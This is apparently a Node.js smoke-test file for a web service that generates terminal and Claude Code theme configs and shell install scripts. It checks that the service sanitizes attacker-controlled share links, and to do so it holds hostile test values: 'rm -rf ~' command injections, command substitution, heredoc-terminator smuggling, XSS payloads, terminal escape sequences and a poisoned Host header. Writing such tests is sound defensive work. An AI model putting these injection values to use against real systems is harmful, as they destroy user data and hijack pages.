// Smoke tests for shayan-cc-config — run with: node test.js
//
// Exercises every route through the real handler, syntax-checks the client JS the
// browser actually receives, bash -n's (and in places runs) the generated shell
// scripts against a sandboxed HOME, and executes the generated status-line script
// against fake transcripts. The "regression fixes" section pins the security and
// preview/install-parity bugs found in review so they cannot come back.
//
// Every payload marked EVIL/hostile stands in for an attacker-supplied share link:
// ?c= and ?shared= are fully user-controlled.
const fs = require('fs');
const os = require('os');
const path = require('path');
const cp = require('child_process');

const ROOT = __dirname;
const handler = require(path.join(ROOT, 'api/index.js'));
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'scc-smoke-'));

let failures = 0;
const ok = (cond, label, extra) => {
  if (cond) console.log('  ✓ ' + label);
  else { failures++; console.log('  ✗ ' + label + (extra ? ' — ' + extra : '')); }
};

function call(url) {
  return new Promise(resolve => {
    const req = { url, headers: { host: 'localhost:3000', 'x-forwarded-proto': 'http' } };
    let body = '';
    const res = {
      statusCode: 200,
      headers: {},
      setHeader(k, v) { this.headers[k.toLowerCase()] = v; },
      end(b) { body = b || ''; resolve({ status: this.statusCode, headers: this.headers, body: String(body) }); },
    };
    handler(req, res);
  });
}

const b64e = o => Buffer.from(JSON.stringify(o), 'utf8').toString('base64')
  .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

const PALETTE = {
  bg: [26, 27, 38], raised: [41, 46, 66], text: [192, 202, 245], comment: [86, 95, 137],
  subtle: [48, 52, 70], accent: [122, 162, 247], accent2: [187, 154, 247], cyan: [125, 207, 255],
  green: [158, 206, 106], red: [247, 118, 142], orange: [255, 158, 100], yellow: [224, 175, 104],
  pink: [187, 154, 247], blue: [122, 162, 247],
};
const LEGACY = { n: 'Legacy One', s: 'teal', p: PALETTE, vf: '{}… ', vv: ['Zooming'], ph: ['·', '✶'], rm: true, ub: 'round', uc: 'rgb(122,162,247)', id: 'abc' };
const V2 = {
  ...LEGACY, n: 'V2 Setup', iv: 90,
  um: { f: ' ❯ {} ', st: ['bold', 'italic', 'nonsense'], fg: '#ff0000', bg: '', px: 2, py: 1, fit: true },
  ib: { rb: true, ch: 'planMode' },
  sl: { on: true, seg: ['model', 'dir', 'git', 'ctx', 'cost', 'lines', 'clock', 'text', 'bogus'], sep: ' · ', em: true, bar: 'shade', ctxFmt: 'tokens', text: 'hi there' },
};
const EVIL = {
  n: "evil'\n\"; rm -rf ~; echo `pwn` $(x) \\ <script>alert(1)</script>", s: 'red; rm -rf /',
  p: PALETTE, vv: ["ok'\nSHAYAN_SL_EOF\n"], ph: ['·'], ub: 'round', uc: 'red;"></span><img src=x onerror=alert(1)>',
  um: { f: 'no placeholder', st: ['bold'], fg: 'javascript:alert(1)', bg: '#zzzzzz', px: 99, py: -5 },
  sl: { on: true, seg: ['model', 'text'], sep: '"; rm -rf ~; "', em: true, bar: 'x', ctxFmt: 'x', text: "pwn'\nSHAYAN_SL_EOF\nrm -rf ~" },
};

function extractScripts(html) {
  const out = [];
  const re = /<script>([\s\S]*?)<\/script>/g;
  let m;
  while ((m = re.exec(html))) out.push(m[1]);
  return out;
}
function nodeCheck(src, label) {
  const f = path.join(TMP, label.replace(/[^a-z0-9]/gi, '_') + '.js');
  fs.writeFileSync(f, src);
  const r = cp.spawnSync('node', ['--check', f], { encoding: 'utf8' });
  ok(r.status === 0, 'js syntax: ' + label, r.stderr && r.stderr.split('\n').slice(0, 3).join(' '));
}
function bashCheck(src, label) {
  const f = path.join(TMP, label.replace(/[^a-z0-9]/gi, '_') + '.sh');
  fs.writeFileSync(f, src);
  const r = cp.spawnSync('bash', ['-n', f], { encoding: 'utf8' });
  ok(r.status === 0, 'bash -n: ' + label, r.stderr && r.stderr.split('\n').slice(0, 3).join(' '));
}

(async () => {
  console.log('— pages —');
  // Every page, not just two: the nav is stamped into all of them from one registry,
  // so a page missing from this loop is a page whose chrome nobody checks.
  const { PAGES } = require(path.join(ROOT, 'api/_nav.js'));
  for (const p of PAGES.map(x => x.path)) {
    const r = await call(p);
    ok(r.status === 200, 'GET ' + p + ' → 200');
    ok(!r.body.includes('${'), p + ' has no unresolved ${} leftovers');
    extractScripts(r.body).forEach((s, i) => nodeCheck(s, p + '_script' + i));
    // One menu button per page, and the registry travels with it. Without the second
    // check the menu would render but have nothing in it.
    ok(r.body.split('id="navbtn"').length === 2, p + ': exactly one menu button');
    // Every page with a preview pins it by default, and all four parts have to agree:
    // the markup, the JS default, the sticky rule for the preview, and the sticky rule
    // for the row holding the unpin button. /herdr and /zellij shipped once with the JS
    // but no CSS, so pinning silently did nothing — hence checking the rule, not the flag.
    if (r.body.includes('id="pinbtn"')) {
      ok(/<body class="pinned">/.test(r.body), p + ': starts pinned in the markup');
      ok(/pinDefault:true/.test(r.body), p + ': starts pinned in the script');
      ok(/body\.pinned \.(terms|cmuxpair|hpair|zpair)\{position:sticky;top:var\(--switch-h/.test(r.body),
        p + ': the pinned preview actually sticks');
      ok(/body\.pinned \.switchrow\{position:sticky;top:0;/.test(r.body),
        p + ': the pin button stays on screen while you scroll');
    }
    ok(/var NAV=\{/.test(r.body), p + ': ships the page registry');
    for (const pg of PAGES) {
      ok(r.body.includes(JSON.stringify(pg.path)), p + ': menu knows about ' + pg.path);
    }
  }
  // ── full separation ───────────────────────────────────────────────────────
  // Every terminal page is a standalone editor now: no Claude Code palette picker,
  // no recipe pairing, its own installer route, and its own saved setups. The recipes
  // module is gone; nothing may import it and no page may point at the combined
  // installer or read a Claude Code payload.
  const homeBody = (await call('/')).body;
  ok(!homeBody.includes('id="recgrid"') && !/recipe/i.test(homeBody),
    'home: the recipes card is gone');
  ok(!fs.existsSync(path.join(ROOT, 'api/_recipes.js')),
    'recipes: the module itself is deleted');
  // /herdr is exclusively herdr: no Claude Code pane, no integration toggle, no
  // mention at all — the whole page is greppable-clean.
  // herdr is exclusively herdr. Two scopes, because two things could leak:
  // (1) herdr's OWN source files — zero mentions, full stop (the installer used to
  //     run 'herdr integration install claude', which writes hooks into ~/.claude);
  // (2) the page a visitor READS — visible text clean outside the shared comparison
  //     card ("which tool when" names all seven tools; that is editorial). Shared
  //     CLIENT_LIB internals keep tweakcc's own schema field names (claude:,
  //     claudeShimmer:) — identifiers, not content, excluded by stripping scripts.
  for (const f of ['api/_herdr.js', 'api/_herdr_page.js']) {
    ok(!/claude/i.test(fs.readFileSync(path.join(ROOT, f), 'utf8')),
      f + ': zero Claude Code references');
  }
  const hdVisible = (await call('/herdr')).body
    .replace(/<section class="cmpwrap" id="compare"[\s\S]*?<\/section>/, '')
    .replace(/<script>[\s\S]*?<\/script>/g, '');
  ok(!/claude/i.test(hdVisible),
    '/herdr: nothing a visitor reads mentions Claude Code outside the comparison card');
  const SEP = [
    { path: '/cmux', route: '/cmux-apply.sh', saved: 'scc_cmux_saved' },
    { path: '/herdr', route: '/herdr-apply.sh', saved: 'scc_herdr_saved' },
    { path: '/zellij', route: '/zellij-apply.sh', saved: 'scc_zellij_saved' },
    { path: '/warp', route: '/warp-apply.sh', saved: 'scc_warp_saved' },
    { path: '/codex', route: '/codex-apply.sh', saved: 'scc_codex_saved' },
  ];
  for (const t of SEP) {
    const body = (await call(t.path)).body;
    // \b guards: window.__sccPayloadC contains the plain substring.
    ok(!/\bccPayload\b/.test(body) && !body.includes('id="ccTheme"'),
      t.path + ': reads no Claude Code payload and offers no palette picker');
    ok(body.includes(t.route + '?c='), t.path + ': its command is its own installer');
    ok(!body.includes("'/apply.sh?c="), t.path + ': nothing points at the combined installer');
    ok(body.includes(t.saved), t.path + ': has its own saved setups');
    ok(!body.includes('installRecipeSave(') && !body.includes('installCcPicker('),
      t.path + ': recipe machinery is gone');
  }
  // The standalone routes themselves: layer-only, bash-clean, refusing empty layers.
  for (const t of SEP.filter(x => x.path !== '/codex')) {
    const key = { '/cmux': 'cm', '/herdr': 'hd', '/zellij': 'zj', '/warp': 'wp' }[t.path];
    const on = Buffer.from(JSON.stringify({ [key]: { on: true } })).toString('base64url');
    const rs = await call(t.route + '?c=' + on);
    ok(rs.status === 200 && /standalone/.test(rs.body) && !/tweakcc/.test(rs.body),
      t.route + ': applies its layer and nothing else');
    const f = path.join(TMP, 'sep-' + key + '.sh');
    fs.writeFileSync(f, rs.body);
    ok(cp.spawnSync('bash', ['-n', f], { encoding: 'utf8' }).status === 0,
      t.route + ': parses as bash');
    const rn = await call(t.route + '?c=' + Buffer.from(JSON.stringify({ n: 'x' })).toString('base64url'));
    ok(rn.status === 404, t.route + ': refuses a payload without its layer');
    // Exclusivity is total: a standalone installer never mentions, reads or writes
    // anything of Claude Code's — no ~/.claude, no claude binary, no integrations
    // run on the user's behalf. (herdr shipped for a while running
    // 'herdr integration install claude', which writes hooks into ~/.claude.)
    ok(!/claude/i.test(rs.body), t.route + ': never touches or mentions Claude Code');
  }

  // ── favorites, folded and split by kind ───────────────────────────────────
  ok(/<details class="favsec" id="favcc"/.test(homeBody)
     && !/id="favrec"/.test(homeBody),
    'home: favorites hold starred setups only — the recipes section is gone');
  ok(homeBody.includes('id="favccgrid"'), 'home: the favorites list exists');
  ok(homeBody.indexOf('id="favwrap"') < homeBody.indexOf('<main id="grid"></main>'),
    'home: favorites sit above the gallery');
  ok(/scc_fold_/.test(homeBody), 'home: a section you folded stays folded');
  // Starred setups MOVE into the section rather than being copied, so a favorite is
  // never on the page twice.
  ok(/favModels\.forEach\(function\(m\)\{fg\.appendChild/.test(homeBody),
    'home: favorited setups render into the favorites section');
  ok(/rest\.forEach\(function\(m\)\{grid\.appendChild/.test(homeBody),
    'home: the gallery below holds what is left');
  // Cards animate on intervals and now live in two containers; scoping the teardown to
  // #grid would leak two timers per favorited card on every repaint.
  ok(/document\.querySelectorAll\('\.card'\)[\s\S]{0,140}clearInterval/.test(homeBody),
    'home: card timers are cleared wherever the card lives');

  // The payoff, end to end: a payload carrying both halves produces one script that
  // applies both. This is the claim the whole feature rests on.
  const recipePayload = {
    ...LEGACY,
    cm: { on: true, preset: '', fontFamily: '', fontSize: 13 },
  };
  const recipeSh = (await call('/apply.sh?c=' + encodeURIComponent(b64e(recipePayload)))).body;
  ok(/tweakcc@latest --apply/.test(recipeSh), 'one recipe curl applies the Claude Code half');
  ok(/Applying the cmux layer/.test(recipeSh), 'one recipe curl applies the terminal half');
  bashCheck(recipeSh, 'recipe_both_halves');

  // Every registered page must actually resolve, or the menu advertises a 404.
  for (const pg of PAGES) {
    const r = await call(pg.path);
    ok(r.status === 200, 'registered page ' + pg.path + ' → 200');
  }

  console.log('— json/config —');
  let r = await call('/api/presets');
  ok(r.status === 200 && JSON.parse(r.body).presets.length === 11, '/api/presets 11 presets');
  r = await call('/config/tokyo-night.json');
  ok(r.status === 200 && JSON.parse(r.body).themes.length >= 1, '/config/tokyo-night.json');
  r = await call('/list.txt');
  ok(r.status === 200 && r.body.trim().split('\n').length === 11, '/list.txt');

  r = await call('/config.json?c=' + encodeURIComponent(b64e(LEGACY)));
  let j = JSON.parse(r.body);
  ok(r.status === 200, 'legacy config.json 200');
  ok(j.userMessageDisplay.borderStyle === 'round' && j.userMessageDisplay.format === ' {} ' && j.userMessageDisplay.fitBoxToContent === true, 'legacy umd matches old behavior', JSON.stringify(j.userMessageDisplay));
  ok(j.thinkingStyle.updateInterval === 120, 'legacy interval default 120');
  ok(!('inputBox' in j), 'legacy has no inputBox key');

  r = await call('/config.json?c=' + encodeURIComponent(b64e(V2)));
  j = JSON.parse(r.body);
  ok(j.userMessageDisplay.format === ' ❯ {} ', 'v2 umd format');
  ok(JSON.stringify(j.userMessageDisplay.styling) === '["bold","italic"]', 'v2 styling whitelisted', JSON.stringify(j.userMessageDisplay.styling));
  ok(j.userMessageDisplay.foregroundColor === 'rgb(255,0,0)', 'v2 fg hex→rgb');
  ok(j.userMessageDisplay.backgroundColor === null, 'v2 empty bg → null');
  ok(j.userMessageDisplay.paddingX === 2 && j.userMessageDisplay.paddingY === 1, 'v2 padding');
  ok(j.thinkingStyle.updateInterval === 90, 'v2 interval');
  ok(j.inputBox && j.inputBox.removeBorder === true && j.inputBox.chevronIdleThemeColor === 'planMode', 'v2 inputBox', JSON.stringify(j.inputBox));

  r = await call('/config.json?c=' + encodeURIComponent(b64e(EVIL)));
  j = JSON.parse(r.body);
  ok(j.userMessageDisplay.format === ' {} ', 'evil umd format falls back');
  ok(j.userMessageDisplay.foregroundColor === 'default', 'evil fg rejected');
  ok(j.userMessageDisplay.paddingX <= 4 && j.userMessageDisplay.paddingY >= 0, 'evil padding clamped');
  ok(/^[\p{L}\p{N}\p{Emoji_Presentation} ._,:!?+()#@\u00d7\u2013\u2014-]*$/u.test(j.themes[0].name) && !/[;<>`$'"\\]/.test(j.themes[0].name), 'evil theme name cleaned', JSON.stringify(j.themes[0].name));

  console.log('— apply scripts —');
  r = await call('/apply/tokyo-night.sh');
  ok(r.status === 200, 'preset apply 200');
  bashCheck(r.body, 'preset_apply');

  r = await call('/apply.sh?c=' + encodeURIComponent(b64e(V2)));
  ok(r.status === 200, 'custom v2 apply 200');
  ok(r.body.includes('statusline-shayan.js'), 'v2 apply installs statusline');
  bashCheck(r.body, 'v2_apply');

  r = await call('/apply.sh?c=' + encodeURIComponent(b64e(LEGACY)));
  ok(!r.body.includes('statusline-shayan.js'), 'legacy apply has no statusline block');
  bashCheck(r.body, 'legacy_apply');

  r = await call('/apply.sh?c=' + encodeURIComponent(b64e(EVIL)));
  ok(r.status === 200, 'evil apply 200');
  const { cleanName } = require(path.join(ROOT, 'api/_term.js'));
  const cn = cleanName(EVIL.n, 60);
  ok(!/[`;<>|&$'"\\\n\r]/.test(cn), 'evil name sanitized to shell-inert text', JSON.stringify(cn));
  ok(r.body.includes(cn), 'evil apply embeds only the sanitized name');
  ok(!r.body.includes('`pwn`') && !r.body.includes('$(x)'), 'evil apply: no command substitution survives');
  bashCheck(r.body, 'evil_apply');
  // heredoc integrity: the statusline heredoc must contain exactly one terminator line
  const marks = r.body.split('\n').filter(l => l.trim() === 'SHAYAN_SL_EOF').length;
  ok(marks === (r.body.includes('SHAYAN_SL_EOF') ? 1 : 0) || marks === 1, 'evil apply: single heredoc terminator', 'found ' + marks);

  console.log('— statusline script —');
  r = await call('/statusline.js?c=' + encodeURIComponent(b64e(V2)));
  ok(r.status === 200, 'statusline.js 200');
  const slFile = path.join(TMP, 'sl.js');
  fs.writeFileSync(slFile, r.body);
  nodeCheck(r.body, 'statusline_script');

  // fake transcript with usage
  const tr = path.join(TMP, 'transcript.jsonl');
  fs.writeFileSync(tr, [
    JSON.stringify({ type: 'user', message: { content: 'hi' } }),
    JSON.stringify({ type: 'assistant', message: { usage: { input_tokens: 1200, cache_read_input_tokens: 38000, cache_creation_input_tokens: 900, output_tokens: 450 } } }),
  ].join('\n') + '\n');
  const stdinJSON = JSON.stringify({
    session_id: 'x', transcript_path: tr, cwd: ROOT,
    model: { id: 'claude-opus-5', display_name: 'Opus 5' },
    workspace: { current_dir: ROOT, project_dir: ROOT },
    version: '2.1.12', output_style: { name: 'default' },
    cost: { total_cost_usd: 0.4321, total_duration_ms: 2280000, total_lines_added: 214, total_lines_removed: 58 },
  });
  const run = cp.spawnSync('node', [slFile], { input: stdinJSON, encoding: 'utf8', timeout: 5000 });
  ok(run.status === 0, 'statusline runs', run.stderr);
  const plain = (run.stdout || '').replace(/\x1b\[[0-9;]*m/g, '');
  console.log('    output: ' + JSON.stringify(run.stdout && run.stdout.slice(0, 160)));
  console.log('    plain : ' + plain);
  ok(plain.includes('Opus 5'), 'sl: model name');
  ok(plain.includes('shayan-cc-config'), 'sl: dir');
  const curBranch = cp.execSync('git rev-parse --abbrev-ref HEAD', { cwd: ROOT, encoding: 'utf8' }).trim();
  ok(plain.includes(curBranch), 'sl: git branch (' + curBranch + ')', plain);
  ok(/\d+k\/200k/.test(plain), 'sl: tokens fmt');
  ok(plain.includes('$0.43'), 'sl: cost');
  ok(plain.includes('+214/-58'), 'sl: lines');
  ok(plain.includes('hi there'), 'sl: custom text');

  // statusline with missing/empty inputs should not crash
  const run2 = cp.spawnSync('node', [slFile], { input: '{}', encoding: 'utf8', timeout: 5000 });
  ok(run2.status === 0, 'statusline tolerates empty json', run2.stderr);
  const run3 = cp.spawnSync('node', [slFile], { input: 'not json', encoding: 'utf8', timeout: 5000 });
  ok(run3.status === 0, 'statusline tolerates garbage stdin', run3.stderr);

  // evil payload statusline still safe + syntactically valid
  r = await call('/statusline.js?c=' + encodeURIComponent(b64e(EVIL)));
  ok(r.status === 200, 'evil statusline.js 200');
  nodeCheck(r.body, 'evil_statusline');
  ok(!r.body.includes('rm -rf'), 'evil statusline has no injection text');

  console.log('— regression fixes —');
  // XSS: hostile palette must never reach a style attribute
  const XSSPAL = { ...PALETTE, text: ['0)"><img src=x onerror="window.__X=1"><span data-z="', 0, 0], accent: 'rgb(1,2,3);evil' };
  const home = (await call('/')).body;
  const { sanePalette, cleanTerm, cleanFormat } = require(path.join(ROOT, 'api/_term.js'));
  const sp = sanePalette(XSSPAL);
  ok(Array.isArray(sp.text) && sp.text.every(n => typeof n === 'number'), 'sanePalette coerces hostile triple', JSON.stringify(sp.text));
  ok(Array.isArray(sp.accent) && sp.accent.length === 3, 'sanePalette replaces non-array entry', JSON.stringify(sp.accent));
  ok(homeBody.includes('function sanePal('), 'homepage ships client palette sanitizer');
  ok(homeBody.includes('expandPalette(sanePal(pl.p))'), 'customToModel sanitizes palette before expanding');
  ok(/mapPreview[\s\S]{0,400}okColor/.test(home), 'mapPreview coerces colors through okColor');
  // Exercise the real client library (the exact source the browser receives) against
  // the hostile payload. CLIENT_LIB is pure function declarations, so evaluating it
  // standalone is safe; the page's boot code (HOME_JS) is deliberately excluded.
  const { CLIENT_LIB } = require(path.join(ROOT, 'api/_render.js'));
  ok(homeBody.includes(CLIENT_LIB), 'rendered homepage embeds CLIENT_LIB verbatim');
  const sandbox = { location: { origin: 'http://x' }, localStorage: { getItem: () => null, setItem() {} }, document: { querySelector: () => null } };
  const lib = new Function('window', 'location', 'localStorage', 'document',
    CLIENT_LIB + '\n;return {customToModel:customToModel, mapPreview:mapPreview, sanePal:sanePal};')(
    sandbox, sandbox.location, sandbox.localStorage, sandbox.document);
  const model = lib.customToModel({ n: 'x', p: XSSPAL, vv: ['a'], ph: ['.'], uc: 'red;"><img src=y>' });
  const badColor = Object.entries(model.colors).find(([, v]) => /[<>"']/.test(String(v)));
  ok(!badColor, 'no preview color can escape a style attribute', badColor && JSON.stringify(badColor));
  ok(!/[<>"']/.test(model.umd.borderColor), 'borderColor validated', model.umd.borderColor);

  // sl.bar prototype-key bypass
  const PROTO = { ...LEGACY, sl: { on: true, seg: ['ctx', 'model'], bar: 'constructor', ctxFmt: 'pct', sep: ' | ', em: true, text: '' } };
  r = await call('/statusline.js?c=' + encodeURIComponent(b64e(PROTO)));
  ok(r.status === 200, 'proto-key statusline 200');
  const protoFile = path.join(TMP, 'proto-sl.js');
  fs.writeFileSync(protoFile, r.body);
  const cfgB64 = /Buffer\.from\('([A-Za-z0-9+/=]+)'/.exec(r.body);
  const protoCfg = JSON.parse(Buffer.from(cfgB64[1], 'base64').toString('utf8'));
  ok(Array.isArray(protoCfg.barChars) && protoCfg.barChars.length === 2, 'proto-key falls back to real barChars', JSON.stringify(protoCfg.barChars));
  const protoRun = cp.spawnSync('node', [protoFile], { input: stdinJSON, encoding: 'utf8', timeout: 5000 });
  const protoPlain = (protoRun.stdout || '').replace(/\x1b\[[0-9;]*m/g, '');
  ok(!protoPlain.includes('statusline error'), 'proto-key statusline renders without error', protoPlain);
  ok(/[▮▯]/.test(protoPlain), 'proto-key statusline draws a bar', protoPlain);

  // terminal-control injection into verbs/phases/formats
  const ESCP = { ...LEGACY, vf: '{}\x1b[2J', vv: ['\x1b]0;PWNED', '\x1b[31mred', 'ok'], ph: ['\x1b[5m', 'a'], um: { f: ' {} \x1b[7m' } };
  r = await call('/config.json?c=' + encodeURIComponent(b64e(ESCP)));
  j = JSON.parse(r.body);
  const allStrings = JSON.stringify([j.thinkingVerbs, j.thinkingStyle.phases, j.userMessageDisplay.format]);
  ok(!/\\u001b|\x1b/.test(allStrings), 'no ESC survives into config', allStrings.slice(0, 160));
  ok(j.thinkingVerbs.format.includes('{}'), 'verb format keeps placeholder');
  ok(j.userMessageDisplay.format.includes('{}'), 'umd format keeps placeholder');
  ok(cleanTerm('ab‮c', 40) === 'abc', 'cleanTerm strips C1 + bidi', JSON.stringify(cleanTerm('ab‮c', 40)));
  ok(cleanFormat('x'.repeat(39) + '{}', 40, 'FB') === 'FB', 'format truncation cannot orphan the placeholder');

  // origin header validation — hostile, malformed and legitimate-but-unusual hosts
  const hostCase = h => {
    let body = '', status = 0, threw = null;
    try {
      handler({ url: '/shayan.sh', headers: { host: h } },
        { statusCode: 200, setHeader() {}, end(b) { body = String(b); status = this.statusCode; } });
    } catch (e) { threw = e; }
    return { body, status, threw, origin: (body.match(/^ORIGIN="(.*)"$/m) || [])[1] };
  };
  const evil = hostCase('x.com" ; rm -rf ~ ; echo "');
  ok(!evil.threw && !evil.body.includes('rm -rf'), 'hostile Host header rejected', evil.origin);
  bashCheck(evil.body, 'evil_host_apply');
  // new URL() throws above port 65535 — an unguarded handler took the process down.
  for (const h of ['localhost:99999', 'localhost:65536', 'localhost:0', 'a'.repeat(300)]) {
    const c = hostCase(h);
    ok(!c.threw && c.status === 200 && c.origin === 'https://shayan-cc-config.vercel.app',
      `Host ${JSON.stringify(h.slice(0, 20))} falls back instead of throwing`, c.threw ? String(c.threw.message) : c.origin);
  }
  for (const h of ['[::1]:3177', 'my_host.local:3177', 'localhost:65535']) {
    const c = hostCase(h);
    ok(!c.threw && c.origin === 'https://' + h, `Host ${JSON.stringify(h)} preserved for self-hosting`, c.origin);
  }

  // paletteSeedHex must agree with the rendered terminal background
  const DATA = require(path.join(ROOT, 'api/_data.js'));
  const { paletteSeedHex, previewColors: pc } = require(path.join(ROOT, 'api/_term.js'));
  const mismatches = DATA.presets.map(p => {
    const th = p.theme || DATA.defaultThemes.find(t => t.id === 'dark');
    const seedBg = paletteSeedHex(th.colors).bg;
    const prevBg = pc(th.colors).bg;
    const m = /rgb\((\d+),\s*(\d+),\s*(\d+)\)/.exec(prevBg);
    const prevHex = m ? '#' + [m[1], m[2], m[3]].map(n => (+n).toString(16).padStart(2, '0')).join('') : prevBg;
    return seedBg === prevHex ? null : `${p.id}: seed ${seedBg} vs preview ${prevHex}`;
  }).filter(Boolean);
  ok(mismatches.length === 0, 'every preset seeds the bg the preview paints', mismatches.join('; '));

  // /apply.sh and /config.json must agree about what they accept
  for (const junk of ['just a string', 42, [1, 2, 3], null]) {
    const enc = encodeURIComponent(b64e(junk));
    const ap = await call('/apply.sh?c=' + enc);
    const cf = await call('/config.json?c=' + enc);
    ok(ap.status === 400 && cf.status === 400, `both routes reject ${JSON.stringify(junk)}`,
      `apply=${ap.status} config=${cf.status}`);
  }

  // Studio page: structural checks only. Behavioral preview-vs-install parity is
  // covered by test-parity.js, which runs the real client functions — substring greps
  // here would pass on a buggy build and silently rot when the code moves.
  const cust = (await call('/customize')).body;
  ok(cust.includes('if(allowDraft)'), 'studio guards the saved draft');
  ok(cust.includes('ownKey(SL_BARSETS,sl.bar)'), 'studio uses own-property bar check');
  ok(cust.includes('slwarn'), 'studio warns when no segments are selected');
  ok(/c_reset[\s\S]{0,400}clearTimeout\(_urlT\)/.test(cust), 'reset cancels the pending URL write');
  extractScripts(cust).forEach((s, i) => nodeCheck(s, 'customize_fixed_script' + i));

  // The preview dock: sticky is a choice, and the height is draggable. Both pages get
  // the same behaviour out of installPreviewDock(), so both are checked the same way.
  for (const [page, html, term] of [['/customize', cust, '.tcol .xterm'], ['/cmux', (await call('/cmux')).body, '.cterm']]) {
    ok(html.includes('id="pinbtn"'), page + ': the preview can be pinned');
    ok(html.includes('id="dockgrip"') && html.includes('role="separator"'),
      page + ': the preview has a resize handle');
    ok(html.includes("term:'" + term + "'"), page + ': the handle resizes that page’s terminal');
    ok(html.includes('body.docked'), page + ': a dragged height has a rule to apply it');
    // Sticky must be conditional, or the toggle has nothing to turn off.
    ok(/body\.pinned (\.terms|\.cmuxpair)\{position:sticky/.test(html),
      page + ': sticky is gated on the pin, not unconditional');
    ok(html.includes('aria-orientation="horizontal"') && html.includes('tabindex="0"'),
      page + ': the handle is reachable and described for assistive tech');
  }
  // A phone must still be able to scroll the controls: the drag clamps to 72% of the
  // viewport, and the floor keeps a zero-height (backgrounded) viewport from collapsing it.
  ok(cust.includes('window.innerHeight*0.72') && cust.includes('Math.max(MIN+60'),
    'the dragged height is clamped at both ends');

  // usage beyond the assumed window: full bar, count alone, no impossible fraction
  const bigTr = path.join(TMP, 'big.jsonl');
  fs.writeFileSync(bigTr, JSON.stringify({ message: { usage: { input_tokens: 640000, output_tokens: 1000 } } }) + '\n');
  const bigRun = cp.spawnSync('node', [slFile], {
    input: JSON.stringify({ transcript_path: bigTr, cwd: ROOT, model: { id: 'claude-fable-5', display_name: 'Fable 5' } }),
    encoding: 'utf8', timeout: 5000,
  });
  const bigPlain = (bigRun.stdout || '').replace(/\x1b\[[0-9;]*m/g, '');
  ok(bigRun.status === 0, 'statusline handles >200k usage', bigRun.stderr);
  ok(bigPlain.includes('641k') && !/641k\/200k/.test(bigPlain), 'no impossible fraction past the window', bigPlain);

  // after compaction, usage from before the boundary must not be reported
  const cTr = path.join(TMP, 'compact.jsonl');
  const slCtx = path.join(TMP, 'sl-ctx.js');
  r = await call('/statusline.js?c=' + encodeURIComponent(b64e({ ...LEGACY, sl: { on: true, seg: ['model', 'ctx'], sep: ' | ', em: false, bar: 'blocks', ctxFmt: 'pct-of', text: '' } })));
  fs.writeFileSync(slCtx, r.body);
  const ctxRun = trPath => {
    const out = cp.spawnSync('node', [slCtx], {
      input: JSON.stringify({ transcript_path: trPath, cwd: ROOT, model: { id: 'claude-fable-5', display_name: 'Fable 5' } }),
      encoding: 'utf8', timeout: 5000,
    });
    return (out.stdout || '').replace(/\x1b\[[0-9;]*m/g, '');
  };
  fs.writeFileSync(cTr, [
    JSON.stringify({ type: 'assistant', message: { usage: { input_tokens: 168820, output_tokens: 0 } } }),
    JSON.stringify({ type: 'system', subtype: 'compact_boundary' }),
    JSON.stringify({ type: 'user', isCompactSummary: true, message: { content: 's' } }),
  ].join('\n') + '\n');
  const postCompact = ctxRun(cTr);
  ok(!/%/.test(postCompact), 'ctx hides stale pre-compaction usage', postCompact);
  fs.appendFileSync(cTr, JSON.stringify({ type: 'assistant', message: { usage: { input_tokens: 65000, output_tokens: 400 } } }) + '\n');
  const afterTurn = ctxRun(cTr);
  ok(/33%/.test(afterTurn), 'ctx returns with post-compaction usage', afterTurn);
  const plainTr = path.join(TMP, 'plain.jsonl');
  fs.writeFileSync(plainTr, JSON.stringify({ type: 'assistant', message: { usage: { input_tokens: 40000, output_tokens: 1000 } } }) + '\n');
  ok(/21%/.test(ctxRun(plainTr)), 'ctx unaffected in a normal session', ctxRun(plainTr));

  console.log('— statusline robustness —');
  // A generated script runs on every prompt render, so degenerate status JSON must
  // never crash it, print NaN, add a line, or blank the whole status line.
  const slAll = path.join(TMP, 'sl-all.js');
  r = await call('/statusline.js?c=' + encodeURIComponent(b64e({
    ...LEGACY,
    sl: { on: true, seg: ['model', 'dir', 'git', 'ctx', 'cost', 'dur', 'lines', 'style', 'ver', 'clock', 'text'], sep: ' | ', em: false, bar: 'blocks', ctxFmt: 'pct-of', text: 'tail' },
  })));
  fs.writeFileSync(slAll, r.body);
  const runSl = stdin => {
    const out = cp.spawnSync('node', [slAll], { input: typeof stdin === 'string' ? stdin : JSON.stringify(stdin), encoding: 'utf8', timeout: 5000 });
    return { code: out.status, plain: (out.stdout || '').replace(/\x1b\[[0-9;]*m/g, ''), err: out.stderr || '' };
  };
  const mkTr = (obj, name) => { const p = path.join(TMP, name); fs.writeFileSync(p, JSON.stringify(obj) + '\n'); return p; };

  // the 100% -> 40% collapse: output_tokens pushing the sum past 200k must not retier
  const nearFull = mkTr({ message: { usage: { input_tokens: 198000, output_tokens: 500 } } }, 'near.jsonl');
  const justOver = mkTr({ message: { usage: { input_tokens: 198000, output_tokens: 4000 } } }, 'over.jsonl');
  const a = runSl({ transcript_path: nearFull, cwd: ROOT, model: { id: 'claude-fable-5', display_name: 'M' } });
  const b = runSl({ transcript_path: justOver, cwd: ROOT, model: { id: 'claude-fable-5', display_name: 'M' } });
  const pctOf = s => { const m = /(\d+)%/.exec(s); return m ? +m[1] : null; };
  ok(pctOf(a.plain) === 99 && pctOf(b.plain) === 100,
    'gauge rises to 100% instead of collapsing when 200k fills', `${pctOf(a.plain)}% then ${pctOf(b.plain)}%`);
  ok(/of 200k/.test(b.plain), 'window stays 200k rather than inventing a larger tier', b.plain);
  // "1M", not "1000k" — a million-token window is the case the window basis exists for,
  // and spelling it in thousands is the least readable way to write it.
  const oneM = runSl({ transcript_path: justOver, cwd: ROOT, model: { id: 'claude-sonnet-5[1m]', display_name: 'M' } });
  ok(/of 1M/.test(oneM.plain), '1m marker still selects the 1m window', oneM.plain);
  // The payload's own context_window_size outranks the model-id guess when present.
  const fromPayload = runSl({
    transcript_path: justOver, cwd: ROOT, model: { id: 'no-marker-here', display_name: 'M' },
    context_window: { context_window_size: 1000000 },
  });
  ok(/of 1M/.test(fromPayload.plain),
    'the reported context window beats the model-id guess', fromPayload.plain);

  // ── the effort segment and the auto-compact basis ─────────────────────────
  // Through the real route, like every other status-line test here — that exercises the
  // sanitizer and the generator together rather than just the generator.
  const slFile2 = path.join(TMP, 'sl-effort.js');
  const mkSl = async (seg, basis) => {
    const res = await call('/statusline.js?c=' + encodeURIComponent(b64e({
      ...LEGACY,
